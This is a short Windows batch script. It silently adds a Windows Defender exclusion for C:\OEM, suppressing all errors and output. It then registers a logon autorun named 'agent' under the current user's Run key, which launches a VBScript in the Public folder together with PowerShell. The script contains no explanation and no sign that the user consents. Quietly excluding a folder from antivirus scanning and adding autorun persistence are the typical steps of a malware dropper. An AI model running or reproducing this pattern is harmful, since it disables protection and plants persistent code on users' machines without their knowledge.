@echo off
echo Adding Windows Defender exclusions...
powershell -NoProfile -Command "try { Add-MpPreference -ExclusionPath 'C:\OEM' -ErrorAction Stop } catch { }" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v agent /t REG_SZ /d "wscript.exe \"C:\Users\Public\launch.vbs\" powershell.exe" /f
